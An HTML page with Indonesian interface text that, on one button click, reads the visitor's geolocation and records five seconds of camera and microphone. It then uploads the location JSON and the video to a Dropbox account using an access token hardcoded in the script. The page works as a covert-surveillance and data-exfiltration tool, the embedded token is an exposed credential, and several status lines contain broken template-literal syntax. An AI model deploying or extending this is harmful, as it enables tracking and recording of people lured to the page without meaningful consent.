<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking and Uploading to Dropbox</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 20px;
            background-color: #f5f5f5;
        }
        h1 {
            color: #4CAF50;
        }
        #actionBtn {
            padding: 15px;
            background-color: #4CAF50;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: 0.3s;
        }
        #actionBtn:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 20px;
            color: #555;
        }
    </style>
</head>
<body>
    <h1>Proses Tracking dan Upload ke Dropbox</h1>
    <button id="actionBtn">Mulai Proses</button>
    <p id="status">Tekan tombol untuk memulai proses.</p>

    <script>
        let actionBtn = document.getElementById('actionBtn');
        let status = document.getElementById('status');
        let mediaStream;
        let mediaRecorder;
        let recordedChunks = [];
        let locationData = null;

        // Ganti dengan token akses Dropbox Anda
        const DROPBOX_ACCESS_TOKEN = 'UwS97ukIVHCM_ewt3mdZeSJeyyA1tXJH1oy3PhirAZ1xR2Avy6vFbsMzBivqv0JHQw9MKjvaAqB_sgzJF4xNNwdgD2eA4CSqSnFpeVdmPLMu0HcRzlLmMblUHY5ClRE2NrxRtZ';

        // Fungsi untuk melacak lokasi pengguna
        function trackLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude
                        };
                        resolve(locationData);
                    }, function(error) {
                        reject('Gagal melacak lokasi: ' + error.message);
                    });
                } else {
                    reject('Geolocation tidak didukung di browser ini.');
                }
            });
        }

        // Fungsi untuk memulai video
        function startVideo() {
            return navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        }

        // Fungsi untuk mulai merekam video
        function startRecording(stream) {
            return new Promise((resolve) => {
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = function(event) {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = function() {
                    let blob = new Blob(recordedChunks, { type: 'video/webm' });
                    resolve(blob);
                };

                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000); // Rekam selama 5 detik
            });
        }

        // Fungsi untuk mengunggah file ke Dropbox
        function uploadToDropbox(fileBlob, fileName) {
            const url = 'https://content.dropboxapi.com/2/files/upload';
            const xhr = new XMLHttpRequest();

            xhr.open('POST', url, true);
            xhr.setRequestHeader('Authorization', 'Bearer ' + DROPBOX_ACCESS_TOKEN);
            xhr.setRequestHeader('Content-Type', 'application/octet-stream');
            xhr.setRequestHeader('Dropbox-API-Arg', JSON.stringify({
                path: '/Uploads/' + fileName,
                mode: 'add',
                autorename: true,
                mute: false
            }));

            xhr.onload = function() {
                if (xhr.status === 200) {
                    status.textContent = File "${fileName}" berhasil diunggah ke Dropbox.;
                } else {
                    status.textContent = Gagal mengunggah file: ${xhr.responseText};
                }
            };

            xhr.onerror = function() {
                status.textContent = 'Terjadi kesalahan saat mengunggah file.';
            };

            xhr.send(fileBlob);
        }

        // Fungsi utama untuk memulai semua proses
        async function startAllFunctions() {
            actionBtn.disabled = true;
            status.textContent = 'Memulai proses...';

            try {
                // Lacak lokasi
                const location = await trackLocation();
                status.textContent = Lokasi berhasil dilacak: Lat ${location.latitude}, Long ${location.longitude};

                // Simpan lokasi ke Dropbox
                const locationBlob = new Blob([JSON.stringify(location)], { type: 'application/json' });
                uploadToDropbox(locationBlob, 'location.json');

                // Akses kamera dan mulai merekam
                mediaStream = await startVideo();
                const videoBlob = await startRecording(mediaStream);

                // Upload video ke Dropbox
                uploadToDropbox(videoBlob, 'recorded_video.webm');
            } catch (error) {
                status.textContent = 'Kesalahan: ' + error;
            } finally {
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                actionBtn.disabled = false;
                actionBtn.textContent = 'Mulai Lagi';
            }
        }

        // Tambahkan event listener pada tombol
        actionBtn.addEventListener('click', startAllFunctions);
    </script>
</body>
</html>
